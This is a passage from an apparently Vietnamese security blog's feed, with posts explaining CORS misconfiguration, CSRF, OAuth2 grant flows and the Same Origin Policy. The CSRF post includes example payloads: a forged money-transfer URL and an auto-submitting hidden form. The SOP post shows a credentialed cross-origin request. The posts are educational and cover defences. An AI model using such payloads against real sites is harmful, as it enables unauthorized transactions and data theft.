cross-origin request bằng iframe để tạo ra giá trị NULL cho Origin header. Phần này thì mình chưa hiểu rõ cách tấn công lắm nhưng các bạn có thể tham khảo ở trên <a href="https://portswigger.net/web-security/cors">Portswigger</a>.<br>Và còn một số vấn đề nữa nếu đứng từ local do lỗi cấu hình, các bạn tham khảo thêm ở trên mình sẽ không trình bày vì mục tiêu của mình không cần đến. Ngoài ra trên PortSwigger còn có rất nhiều bài lab để các bạn thực hành tấn công.</p><h2 id="Mot-so-anh-huong-tu-cau-hinh-CORS-loi"><a href="#Mot-so-anh-huong-tu-cau-hinh-CORS-loi" class="headerlink" title="Một số ảnh hưởng từ cấu hình CORS lỗi"></a>Một số ảnh hưởng từ cấu hình CORS lỗi</h2><ul><li>Đầu tiên phải kể đến đó là rò rỉ thông tin người dùng.</li><li>Kẻ tấn công có thể lợi dụng lỗ hổng XSS trên các Origin được tin tưởng ,  chỉ định (CORS) để leo thang lỗ hổng. (Nhiều tiên hơn kk)</li><li>Tăng khả năng bị tấn công CSRF.<img src="/images/CORS/CORS3.png" class="[class names]" title="[500] [500] " alt="title text"></li></ul><p>Ok xin chào và hẹn gặp lại các bạn ở bài viết sau. Phần trình bày của mình đến đây là hết chúc các bạn có thể kiếm thật nhiều bounty nhưng hãy nhớ kiến thức mới là gía trị nhất.</p><h2 id="Link-tham-khao"><a href="#Link-tham-khao" class="headerlink" title="Link tham khảo"></a>Link tham khảo</h2><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Simple_requests">https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Simple_requests</a></li><li><a href="https://portswigger.net/web-security/cors">https://portswigger.net/web-security/cors</a></li><li><a href="https://medium.com/@jeanpan/what-is-cors-cross-origin-resource-sharing-9f0c463621c6">https://medium.com/@jeanpan/what-is-cors-cross-origin-resource-sharing-9f0c463621c6</a></li><li><a href="https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397">https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; TL;DR&lt;br&gt; Trước khi nói về C0RS, Mk muốn nói lại một chút về Cross-Origin access. Như trong phần trước về SOP mình cũng đã trình bày, vi
      
    
    </summary>
    
    
      <category term="Technology" scheme="http://blog.hydrasky.ml/tags/Technology/"/>
    
  </entry>
  
  <entry>
    <title>Cross Side Request Forgery</title>
    <link href="http://blog.hydrasky.ml/2020/06/15/CROSS%20SIDE%20REQUEST%20FORGERY/"/>
    <id>http://blog.hydrasky.ml/2020/06/15/CROSS SIDE REQUEST FORGERY/</id>
    <published>2020-06-15T04:00:00.000Z</published>
    <updated>2020-06-15T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h4>CSRF là gì ?</h4><p>Cross site request forgery viết tắt là CSRF là một trong những lỗ hổng khá phổ biến của web application, lọt vào top 10 lỗ hổng của OWASP. Cũng được biết đến với các tên gọi <em>one-click attack, session riding, XSRF</em>,(còn mk thích gọi là client site request forgery :) ) , là một phương thức tấn công lừa trình duyệt người dùng thực hiện những request không mong muốn đến server trong khi họ vẫn trong phiên đăng nhập để attacker bypass xác thực.</p><!-- wp:image {"width":591,"height":444} --><p><img src="https://manhnv.com/images/posts/csrf-cross-site-request-forgery-la-gi-lam-the-nao-de-ngan-chan-tan-cong-csrf/Cross-Site-Request-Forgery.jpg?raw=true" alt="Cách tấn công CSRF"></p><h4>Yếu tố dẫn đến lỗ hổng</h4><p>Chúng ta đều biết server cho phép lưu trữ cookie ở phía người dùng để phân biệt người dùng. Mỗi khi người dùng gửi một request tới một domain nào đó, cookie sẽ được tự động gửi kèm theo. Những web app chỉ sử dụng xác thực thông qua cookie , session cookie sẽ có nguy cơ bị tấn công CSRF. Tác động của nó đến người dùng có thể như thay đổi thông tin như usame, mail, password … hay các hoạt động như là chuyển tiền , xóa tài khoản … . Cùng xem ví dụ dưới đây :</p><p><img src="https://manhnv.com/images/posts/csrf-cross-site-request-forgery-la-gi-lam-the-nao-de-ngan-chan-tan-cong-csrf/CSRF-copy.jpg?raw=true"></p><p> Một website có chức năng tiền và xác thực thông qua “Auth Cookie “ của người dùng và tất nhiên giá trị attacker sẽ không thể biết hay đoán được này. Attacker sẽ tạo ra một GET request đến website vs URL có nội dung là chuyển tiền đến 1 tài khoản của hacker như sau :</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bank.com&#x2F;app&#x2F;transfer?amount&#x3D;100000&amp;destinationAccount&#x3D;7895457898054</span><br><span class="line">GET Request</span><br></pre></td></tr></table></figure><p>Hoặc nếu server chỉ nhận POST request thì attacker sẽ tạo ra một form trong file html như sau:</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;bank.com&#x2F;app&#x2F;transfer&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;destinationAcount&quot; value&#x3D;&quot;7895457898054&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;hidedn&quot; name&#x3D;&quot;amount&quot; value&#x3D;&quot;100000&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.forms[0].submit();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;POST request</span><br></pre></td></tr></table></figure><p>Khi trình duyệt của người dùng thực thi link hay file này sẽ đính kèm giá trị “Auth cookie” của website cấp cho người dùng đã được lưu để duy trì đăng nhập vào request lên server . Hiển nhiên phía server sẽ xác định đây là request do người dùng thực hiện và chuyển tiền tới tài khoản của attacker.</p><h4>Cách thức tấn công </h4><p>Đối với các request mà server chỉ nhận phương thức POST ,attacker sẽ tạo form trong file html và gửi cho nạn nhân hoặc bạn sẽ phải tạo một trang web fishing để lừa nạn nhân truy cập vào và thực hiện request.</p><p>Còn đối với request mà server dùng phương thức GET , attacker cũng có thể dùng form như phương thức POST nhưng thường cách dễ dàng hơn là gửi 1 URL có chứa các tham sỗ đã set sẵn. Hacker sẽ bỏ URL này vào 1 thẻ img, hoặc sử dụng các trang web phising để lừa người dùng thực thi.</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;jav.bank?from&#x3D;Person1&amp;to&#x3D;Person2&amp;amount&#x3D;1000</span><br><span class="line">Ví dụ URL</span><br></pre></td></tr></table></figure><p>Ngoài ra còn một số cách khai thác đặc biệt đối với các kiểu dữ liệu được gửi đi ví dụ với JSON data. Các bạn có thể tham khảo ở đây :</p><ul><li><a href="https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b">https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b</a></li><li><a href="https://medium.com/@osamaavvan/json-csrf-to-formdata-attack-eb65272376a2">https://medium.com/@osamaavvan/json-csrf-to-formdata-attack-eb65272376a2</a></li><li><a href="https://medium.com/@pig.wig45/json-csrf-attack-on-a-social-networking-site-hackerone-platform-3d7aed3239b0">https://medium.com/@pig.wig45/json-csrf-attack-on-a-social-networking-site-hackerone-platform-3d7aed3239b0</a></li></ul><p>Một số trường hợp có thể đoán được giá trị xác thực như việc sử dụng referer-header để xác thực hoặc server cùng tồn tại lỗ hổng CRLF cũng có thể dẫn đến tấn công cookie injection và chuyển sang tấn công CSRF. </p><p>Cuối cùng là việc sử dụng xác thực lỏng lẻo như csrf_token không liên kết với users session hoặc bỏ qua xác thực nếu không nhận được csrf_token đều có thể dẫn đến bypass.</p><p>Tất cả các trường hợp đều được giải thích rõ  và thực hành trong các lab của PortSwigger, các bạn có thể tham khảo link cuối bài.</p><h4>Làm thế nào để ngăn chặn tấn công CSRF?</h4><p>Người dùng không nên click vào các đường dẫn mà bạn nhận được qua email, qua facebook … Khi bạn đưa chuột qua 1 đường dẫn, phía dưới bên trái của trình duyệt thường có địa chỉ website đích, bạn nên lưu ý để đến đúng trang mình muốn. Không truy cập vào các trang web độc hại dễ bị lừa. Không thực thi các file không rõ nguồn gốc và chức năng. </p><p>Còn về phía server sử dụng captcha, các thông báo xác nhận. Captcha được sử dụng để nhận biết đối tượng đang thao tác với hệ thống là con người hay không? Các thao tác quan trọng như “đăng nhập” hay là “chuyển khoản” ,”thanh toán” thường là hay sử dụng captcha. Tuy nhiên, việc sử dụng captcha có thể gây khó khăn cho một vài đối tượng người dùng và làm họ khó chịu. Các thông báo xác nhận cũng thường được sử dụng, ví dụ như việc hiển thị một thông báo xác nhận “bạn có muốn xóa hay k” cũng làm hạn chế các kĩ thuật Cả hai cách trên vẫn có thể bị vượt qua nếu kẻ tấn công có một kịch bản hoàn hảo và kết hợp với lỗi XSS.</p><p>Và thứ 2 là sử dụng token (csrf_token,jwt …): Tạo ra một token tương ứng với mỗi form, token này sẽ là duy nhất đối với mỗi form và thường thì hàm tạo ra token này sẽ nhận đối số là”SESSION”. Khi request đến, hệ thống sẽ thực hiên so khớp giá trị token này để quyết định có thực hiện hay không.</p><p>Link tham khảo :</p><ul><li><a href="https://gbhackers.com/a8-cross-site-request-forgery-csrf/">https://gbhackers.com/a8-cross-site-request-forgery-csrf/</a></li><li><a href="https://portswigger.net/web-security/csrf">https://portswigger.net/web-security/csrf</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4&gt;CSRF là gì ?&lt;/h4&gt;



&lt;p&gt;Cross site request forgery viết tắt là CSRF là một trong những lỗ hổng khá phổ biến của web application, lọt vào
      
    
    </summary>
    
    
      <category term="Pentest Web" scheme="http://blog.hydrasky.ml/tags/Pentest-Web/"/>
    
  </entry>
  
  <entry>
    <title>OAUTH</title>
    <link href="http://blog.hydrasky.ml/2020/06/14/Oauth/"/>
    <id>http://blog.hydrasky.ml/2020/06/14/Oauth/</id>
    <published>2020-06-14T22:20:34.000Z</published>
    <updated>2020-06-14T22:20:34.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/images/OAUTH/oauth2.jpg" class="[class names]" title="[500] [500] " alt="Oauth2"><p>Xin chào các bạn mình đã quay trở lại với … bài viết dài , thôi vào nội dung luôn .</p><h2>Khái niệm</h2><p> <strong>OAuth</strong>  (Open Authorization) là một phương thức ủy quyền để cung cấp khả năng truy cập các tài nguyên qua giao thức HTTP . OAuth cho phép các trang web hoặc ứng dụng (Customer) truy cập tài nguyên được bảo vệ từ dịch vụ web (Service Provider) thông qua API mà không yêu cầu người dùng tiết lộ thông tin đăng nhập được cấp bởi nhà cung cấp dịch vụ cho bên thứ ba. Nó hoạt động như một trung gian thay mặt cho người dùng cuối, cấp quyền sử dụng thông tin của tài khoản được chia sẻ cho dịch vụ của bên thứ ba với access token.</p><h2>Lịch sử</h2><p>OAuth được phát hành lần đầu tiên vào năm 2007 là phương thức ủy quyền sử dụng cho Twitter application program interface (API) với tên gọi là OpenID . Năm 2010, OAuth 1.0 Revision được xuất bản đê giải quyết về vấn đề session fixation tồn tại. Năm 2012, Nhóm làm việc OAuth của IETF đã xuất bản bản thảo đầu tiên của giao thức OAuth 2.0. Giống như OAuth ban đầu, OAuth 2.0 cung cấp cho người dùng khả năng cấp quyền truy cập ứng dụng của bên thứ ba vào tài nguyên web mà không cần chia sẻ mật khẩu. Tuy nhiên, đây là một giao thức hoàn toàn mới và không tương thích ngược với OAuth 1.0. Các tính năng được cập nhật bao gồm uồng cấp mã ủy quyền mới để áp dụng cho các ứng dụng di động, chữ ký được đơn giản hóa và token tồn tại trong thời gian ngắn với các ủy quyền tồn tại lâu dài. Và hiện tại OAuth đãng triển khai , phát triển phiên bản OAuth 2.1.</p><p>Trong bài viết này mình sẽ chỉ trình bày các thứ liên quan đến phiên bản OAuth2 bởi một phần OAuth 2 đã được sử dụng phổ biến hơn và  nếu mk trình bày cả OAuth1 nữa rất là dài. cực kì nhiều thứ nên các bạn có thể tham khảo bên ngoài hoặc đợi một ngày nào đó mình sẽ viết về nó.</p><h2>Các thuật ngữ sử dụng</h2><p> <strong>Resource owner</strong>  (User) Một thực thể có khả năng cấp quyền truy cập vào một tài nguyên được bảo vệ. Khi chủ sở hữu tài nguyên là một người , nó được gọi là một người dùng cuối.</p><p> <strong>Client</strong>  (Application) Một ứng dụng thực hiện các yêu cầu đến tài nguyên được bảo vệ thay mặt cho chủ sở hữu tài nguyên và với sự ủy quyền của nó . Hiểu một cách đơn giản hơn là những ứng dụng mong muốn truy cập vào dữ liệu người dùng.</p><p> <strong>Authorization server</strong>  (API) Máy chủ cấp phát access token cho client sau khi xác thực thành công với chủ sở hữu tài nguyên và có được ủy quyền.</p><p> <strong>Resource Server</strong>  (API) Máy chủ lưu trữ các tài nguyên được bảo vệ, có quyền chấp nhận và phản hồi các requests có chứa access token đến tài nguyên được bảo vệ, hay chính là xác thực ủy quyền</p><p>Resource Server và Authorization Server là một điểm khác biệt giữa OAuth2 và OAuth1 khi tách biệt hai thao tác: cấp mã ủy quyền (access token) và xác thực ủy quyền (Authentication) thành 2 Server còn OAuth1 thực hiện trên cùng một server gọi là  <strong>Sevice Provider</strong> .</p><h2>OAuth hoạt động như thế nào?</h2><!-- wp:image {"id":345,"sizeSlug":"large"} --><img src="/images/OAUTH/oauth3.png" class="[class names]" title="[500] [500] " alt="Oauth2"><!-- wp:list {"ordered":true} --><ol><li>Client sẽ yêu cầu ủy quyền truy cập các Protected Resource từ Resource owner (User). Cient có thể trực tiếp thực hiện yêu cầu ủy quyền tới Resource owner hoặc thông qua Authorization server enpoint để User cho phép truy cập.</li><li>User sẽ xác thực và ủy quyền truy cập tới Resource cho client , lúc này Ứng dụng sẽ nhận được Cấp phép (Authorization Grant) . Sẽ có 4 kiểu cấp quyền nên việc cấp như thế nào client sẽ phụ thuộc vào loại ứng dụng dùng để truy cập vào tài nguyên. Đây được coi như là chứng chỉ đại diện cho sự ủy quyền của Resource Owner.</li><li>Ứng dụng client yêu cầu access token từ Authorization Server bằng cách chuyển Authorization Grant cùng với các thông tin khác để xác thực, chẳng hạn như  **client ID** ,  **client secret** , and  **grant_type** .</li><li>Khi xác thực thành công, Authorization Server sẽ phát hành  **Access Token**  và  **Refresh Token**  cho ứng dụng client.</li><li>Ứng dụng yêu cầu quyền truy cập vào Protected Resource từ Resource Server và xác thực bằng cách đưa ra Access Token .</li><li>Khi xác thực thành công yêu cầu của máy khách, Resource Server sẽ trả về tài nguyên được yêu cầu.</li></ol><p>Mục đích  <strong>Refresh token</strong>  ở đây là dùng để xác thực với Authorization Server thay vì nhờ User như trên để lấy Access token mới khi Access token cũ đã bị hết hạn. Lưu ý là không phải   <strong>Grant Types</strong>  nào cũng hỗ trợ refresh_token và việc có nhận, sử dụng nó là không bắt buộc, là tùy chọn của bạn.</p><p>grant_type=refresh_token&amp;refresh_token=tGzv3JOkF0XG5Qx2TlKWIA</p><h2> **Authorization grant types** </h2><p>OAuth 2.0 Authorization Framework đã đưa ra 4 luồng để lấy Access Token, các luồng này được gọi là “ <strong>Grant types</strong> “ .</p><h3>Authorization Code Flow</h3><p>Đây là một hình thức ủy quyền được dùng phổ biến nhất hiện nay, thường được sử dụng bởi các ứng dụng web triển khai trên máy chủ và nó có thể cung cấp cả Access Token và Refresh Token. Authentization Code thuộc kiểu  <strong>redirection-based flow</strong>  nên Client có thể tương tác với resource owner và có khả năng nhận các yêu cầu đến từ Authorization Server .</p><h4>Flow</h4><figure class="wp-block-image"><img src="https://i2.wp.com/blogs.innovationm.com/wp-content/uploads/2019/07/blog-open1.png?resize=625%2C348" alt="Oauth2 authorization code flow "/></figure><p>Đầu tiên, chọn đăng nhập thông qua một bên thứ 3 nào đấy , ví dụ trong hình “Login in with Google”</p><p>Ứng dụng (Client)  sẽ chuyển hướng người dùng đến Authorization Server (/authorize endpoint) .</p><p>https:&#47;&#47;accounts.google.com/oauth/authorize?response_type=code&amp;client_id=CLIENT_ID&amp;redirect_uri=yelp.com/callback&amp;scope=profile_contact<br>Trong đó : </p><ul><li>response_type là tham số  chỉ định ứng dụng đang yêu cầu nhận authorization_code </li><li>client_id là ID của ứng dụng đăng kí với service bên thứ 3 đó, Authorization Server sẽ biết khách hàng của ứng dụng nào đang yêu cầu xin ủy quyền.</li><li>redirect_uri là nơi sẽ truyển hướng về khi nhận code</li><li>scope : là phạm vi quyền truy cập</li></ul><p>Authorization Server sẽ chuyến hướng User đến mục đăng nhập nếu như bạn chưa đăng nhập và lời nhắc có cho chép ủy quyền hay không? </p><p>Sau khi User cho phép , Authorization Server sẽ tiếp tục chuyến hướng người dùng quay trở lại ứng dụng  (Client) với Authorization  <strong>CODE</strong>  .( Các bước sau không còn cần tác nhân User)</p><p>https:&#47;&#47;yelp.com/callback?code=AUTHORIZATION_CODE</p><p>Sau khi nhận được, Client sẽ thực hiện một request POST gửi Authorization  <strong>CODE</strong>  đó đến Authorization Server (/oauth/token endpoint) cùng với lại các tham số CLIENT ID và CLIENT SECRET của ứng dụng để Server xác thực . </p><p>https:&#47;&#47;accounts.goole.com/oauth/token?client_id=CLIENT_ID&amp;client_secret=CLIENT_SECRET&amp;grant_type=authorization_code&amp;code=AUTHORIZATION_CODE&amp;redirect_uri=CALLBACK_URL<br>Trong đó :<br>CLIENT SECRET ở đây là một giá trị bí mật chỉ cho phép APP và Authorization Server biết.</p><p>Phía Authorization Server sẽ thực hiện xác thức các giá trị được gửi.</p><p>Nếu như thành công , Authorization Server trả về ID Token và Access Token ( Refresh Token).</p><p>Bây giờ ứng dụng  có thể sử dụng Access Token để truy cập thông tin  của người dùng User thông qua API.</p><p>Grant Type này còn thường được dùng cho mobile apps nhưng có đôi chút khác biệt trong quá trình xin ủy quyền. Nguyên nhân là do native apps hay Single-page apps  không thể lưu trữ hay đảm bảo được tính bí mật cho  <strong>CLIENT SECRET</strong>   nên không thể sử dụng cái giá trị này để Authorization Server xác thực định danh ứng dụng. Và đó là lí do Flow sẽ bị thay đổi với cái tên là Authorization Code Flow với  <strong>Proof Key for Code Exchange (PKCE)</strong> . Lúc này thay vì sử dụng CLIENT SECRET  nó sẽ sử dụng  <strong>CODE VERIF</strong> IER và  <strong>Challenge</strong> . Chi tiết hơn bạn có thể tham khảo <a href="https://auth0.com/docs/flows/concepts/auth-code-pkce" target="_blank" rel="noreferrer noopener">tại đây</a> .</p><p><strong>Implicit Flow</strong></p><p>Loại ủy quyền này thường được sử dụng cho các ứng dụng chạy trên trình duyệt (VD: Chrome Extension) và có thể ấp dụng cho các ứng dụng mà không sử dụng Client Secret nhưng người ta vẫn khuyến cáo bạn nên dùng  ** <strong>PKCE</strong> **  hơn bởi Implicit không quá bảo mật .</p><p>Khác với lại Authorization code , Authorization Server sẽ trả về Access Token luôn thay vì tiến hành trao đổi như Authorization code ,thứ 2 Implicit là  chỉ dùng để lấy access token và không hỗ trợ  Refresh Token.</p><p><strong>FLow</strong></p><img src="/images/OAUTH/auth-sequence-implicit-form-post.png" class="[class names]" title="[500] [500] " alt="Implicit Flow"><p>Đầu tiên  User sẽ chọn login với App thông qua bên thứ 3 </p><p>Trình duyệt/APP lúc này sẽ chuyển hướng người dùng đến Authorizarion Server (/authorize endpoint) cùng với các tham số như response_type=id_token cho biết loại thông tin xác thực được yêu cầu. Nó cũng chuyển cùng một tham số response_mode của form_post để đảm bảo tính bảo mật.</p><p>/authorize?response_type=token&amp;client_id=s6BhdRkqt3&amp;state=xyz&amp;redirect_uri=<a href="https://client.example.com/callback">https://client.example.com/callback</a> </p><p>Phía AS yêu cầu USER xác thực bằng form đăng nhập. User tiến hành xác thực  và ủy quyền cho ứng dụng .</p><p>Authorization Server chuyển hướng người dùng quay trở lại APP cùng với ID Token (Tương tự accsess token).</p><p>http:&#47;&#47;example.com/callback#access_token=2YotnFZFEjr1zCsicMWpAA&amp;state=xyz&amp;token_type=example&amp;expires_in=3600</p><p>Ok như vậy nếu như ứng dụng là 1 web-based app thì đến đây là có thể call API với Access Token để lấy dữ liệu từ Resource Owner. Còn đối với Mobile Application sẽ cần phải có các bước khác để trích xuất Access Token trong URI bằng script và gửi về cho nó. Nhưng một phần vì mình chưa có cơ hội được thực nghiệm nên mình sẽ không trình bày về nó , và dù tài liệu có nói nhưng rất khó mường tượng ra. Bạn có thể tham khảo ở <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc6749#section-4.2" target="_blank">đây</a>.</p><h2>Resource owner credentials grant</h2><p>Grant type này chỉ áp dụng cho  cho những ứng dụng có mức độ tin tưởng cao ( ví dụ như các ứng dụng của các dịch vụ đó phát hành hoặc các ứng dụng mặc định trên hệ thống )  . Bởi vì User sẽ phải cung cấp thông tin username và password trực tiếp cho Application sử dụng để lấy access_token.</p><h4>Flow</h4><figure class="wp-block-image"><img src="https://cdn2.auth0.com/docs/media/articles/api-auth/password-grant.png" alt="Tài nguyên mật khẩu của chủ sở hữu"/></figure><p>Đầu tiên User nhập thông tin đăng nhập (Username/Password) vào ứng dụng.</p><p>grant_type=password&amp;username=johndoe&amp;password=A3ddj3w</p><p>Ứng dụng chuyển tiếp thông tin đăng nhập đến Authorization Server.</p><p>Authorization Server xác thực thông tin và trả về Access Token và Refresh Token.</p><p>Ứng dụng có thể sử dụng Access Token để gọi API .</p><h2>Client Credentials Flow</h2><p>Với các ứng dụng machine-to-machine (M2M), chẳng hạn như CLI, daemon hoặc dịch vụ chạy trên back-end của bạn, hệ thống sẽ xác thực và ủy quyền cho ứng dụng thay vì người dùng. Ứng dụng có thể yêu cầu lấy Access Token bằng bằng các thông tin của ứng dụng như CLIENT ID , CLIENT SECRET.</p><h4>Flow</h4><figure class="wp-block-image"><img src="https://cdn2.auth0.com/docs/media/articles/flows/concepts/auth-sequence-client-credentials.png" alt="Trình tự xác thực luồng thông tin khách hàng"/></figure><p>Client  xác thực với Authorization Server bằng CLIENT ID và CLIENT SECRET .</p><p>Authorization Server  xác thực và  phản hồi với Access Token.</p><p>Ứng dụng của bạn có thể sử dụng Access Token để gọi API cho chính nó.</p><p>Ok như vậy là mình trình bày khá tổng quát về các thứ của OAuth2, mình khuyến khích các bạn đọc thêm về nó chứ mình không thể nào viết chi tiết hơn được nữa mặc dù không khó hiểu nhưng nó quá dài. Mình sẽ để link bài viết ở cuối để các bạn tham khảo.</p><p>Qua bài viết này tôi đã giới thiệu với các bạn về OAuth2: khái niệm, các đối tượng tham gia, các luồng hoạt động , còn việc triển khai thì mình sẽ không trình bày các bạn nên tự tìm hiểu. Còn vấn đề về bảo mật và cách cách bypass thì mình sẽ trình bày vào bài viết sau. Cái gì cũng cần phải lắm chắc lý thuyết trước đã nhé.</p><h2>THAM KHẢO</h2><ul><li><a href="https://auth0.com/docs/getting-started">https://auth0.com/docs/getting-started</a></li><li><a href="https://tools.ietf.org/html/rfc6749">https://tools.ietf.org/html/rfc6749</a> ***</li><li><a href="https://alexbilbie.com/guide-to-oauth-2-grants/#which-oauth-20-grant-should-i-use">https://alexbilbie.com/guide-to-oauth-2-grants/#which-oauth-20-grant-should-i-use</a></li><li><a href="https://curity.io/resources/develop/oauth/oauth-code-flow/">https://curity.io/resources/develop/oauth/oauth-code-flow/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;img src=&quot;/images/OAUTH/oauth2.jpg&quot; class=&quot;[class names]&quot; title=&quot;[500] [500] &quot; alt=&quot;Oauth2&quot;&gt;

&lt;p&gt;Xin chào các bạn mình đã quay trở lại với …
      
    
    </summary>
    
    
      <category term="Technology" scheme="http://blog.hydrasky.ml/tags/Technology/"/>
    
  </entry>
  
  <entry>
    <title>Same Origin Policy</title>
    <link href="http://blog.hydrasky.ml/2020/06/14/Same%20Origin%20Policy/"/>
    <id>http://blog.hydrasky.ml/2020/06/14/Same Origin Policy/</id>
    <published>2020-06-14T22:20:34.000Z</published>
    <updated>2020-06-14T22:20:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>TL;DR<br>Xin chào các bạn, trong bài viết trước mình có giới thiệu với các bạn về  Content Security Policy (CSP) ,hôm nay mình sẽ giới thiệu tiếp một thuật ngữ có liên quan với nó đó là Same Origin Policy (SOP).</p><p>Như các bạn đều biết CSP đươc triển khai ở phía server, chính sách sẽ được gửi về cho phía trình duyệt thông qua HTTP response và trình duyệt sẽ thực thi theo chính sách. Nếu như phía website không cung cấp các chính sách thì phía trình duyệt cũng sử dụng các chính sách bảo mật chung gọi là Same Origin Policy. Nó không phải là một tiêu chuẩn trên internet và mỗi trình duyệt có thể có cách giải thích khác nhau . Ok cùng tìm hiểu nó nào .</p><h2 id="Same-Origin-Plolicy-la-gi"><a href="#Same-Origin-Plolicy-la-gi" class="headerlink" title="Same Origin Plolicy là gì?"></a>Same Origin Plolicy là gì?</h2><p>Same-Origin Policy (có thể tạm gọi là chính sách cùng gốc ) là một tiêu chuẩn về bảo vệ được tích hợp và yêu cầu bắt buộc với các browser hiện đại, , nhằm ngăn chặn việc tương tác giữa các DOM hoặc Script nằm ở các Origin (hoặc địa chỉ) khác nhau, giúp giảm thiểu một số vertor tấn công có thể .</p><h2 id="Tai-sao-can-Same-Origin-Policy"><a href="#Tai-sao-can-Same-Origin-Policy" class="headerlink" title="Tại sao cần Same-Origin Policy ?"></a>Tại sao cần Same-Origin Policy ?</h2><p>Hãy thử tưởng tượng điểu gì xảy ra khi không có SOP, mk sẽ lấy ví dụ cho dễ hiểu:<br>Bạn đăng kí tài hydrasky.ml và các thông tin cá nhận của bạn  được lưu trong một file có url là <a href="https://hydrasky.mk/user/profile.json">https://hydrasky.mk/user/profile.json</a> .Để truy cập vào file này tất nhiên bạn phải là user hợp lệ và website sẽ check điều này bằng cookie của bạn.</p><p>Nhưng hãy nhớ , khi trình duyệt thực hiện các request HTTP từ Origin này đến Origin khác thì cookie (có chứa session) được lưu trên trình duyệt cũng sẽ được tự động thêm vào làm một phần của request.  (Để hiểu rõ hơn hãy tham khảo bài viết về <a href="http://blog.hydrasky.ml/2020/06/14/Session%20&%20Cookie/">session và cookie</a>) của mình).</p><p>Lợi dụng điều này, attacker tạo 1 website example.com , sử dụng các đoạn mã javascript để request đến file và lừa bạn truy cập vào example.com  để lấy thông tin mà bạn không ngờ đến . </p><p>Ví dụ: <em>examle.com</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var req &#x3D; new XMLHttpRequest();</span><br><span class="line">req.open(&quot;GET&quot;, &quot;https:&#x2F;&#x2F;hydrasky.ml&#x2F;user&#x2F;profile.json&quot;);</span><br><span class="line">req.withCredentials &#x3D; true ; # user&#39;s cookie của hydrasky.ml của bạn sẽ được đính kèm với request  </span><br><span class="line">req.send();</span><br><span class="line">...</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">Có 3 lưu ý ở đây là:</span><br><span class="line">1. Bên example.com sẽ không thể đọc và chỉnh sửa được user&#39;s cookie của hydrasky.ml</span><br><span class="line">2. Mặc đinh cookie sẽ không được đính kèm vơi request nếu bạn không đặt Credentical &#x3D; true</span><br><span class="line">3. Không có chuyện user&#39;s cookie của example.com được đính kèm request tới hydrasky.ml , điều này chỉ có thể xảy ra khi 2 origin chỉ cùng host (domain&#x2F;subdomain) mà không phân biệt scheme và port.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Áp điều này ra ngoài thực tế nếu như không có SOP, người ta có thể đọc được tin nhắn GMAIL , thông tin Facebook của bạn vẫn vân và vân vân… . Thực sự nguy hiểm!!!<br>SOP sẽ ngăn chặn việc này lại bằng cách chặn quyền “read” vào các tài nguyên ở Origin khác. Như vậy trong trường hợp trên sẽ không có bất kì data nào được trả về và hiển thị trên example.com cả.  </p><p> Nhưng chờ đã ,thế tại sao  “Tôi vẫn có tải hình ảnh và script từ các nguồn gốc khác khi tôi code web ?”. Đây là một câu hỏi rất hay. Trình duyệt cho phép chúng ta sử dụng một vài thẻ để nhúng tài nguyên từ một nguồn gốc khác một cách hợp lệ như nhúng:</p><ul><li>CSS bằng <code>&lt;link&gt;</code> hoặc @import , nhưng cần thêm Content-type hợp lệ.</li><li>image bằng <code>&lt;img &gt;</code> tag. </li><li>video bằng  <code>&lt;video&gt;</code> tag .</li><li>script bằng <code>&lt;script&gt;</code> tag , tuy nhiên nếu như tài nguyên bạn muốn lấy là một API thì sẽ bị chặn.</li><li>forms submit với <code>action</code> </li><li><code>iframe</code> nhưng nó còn phụ thuộc vào  <code>X-Frame-Options</code> và việc bạn sử dụng nó làm gì.</li><li>Ngoài ra còn một số trường hợp ngoại lệ bạn có thể tham khảo ở <a href="https://portswigger.net/web-security/cors/same-origin-policy">đây</a>.</li></ul><p>Như vậy, vai trò của Same-Origin Policy không phải là ngăn chặn các trang Web đọc được nguồn dữ liệu từ Website khác, mà chủ yếu là để ngăn chặn các Website đọc các thông 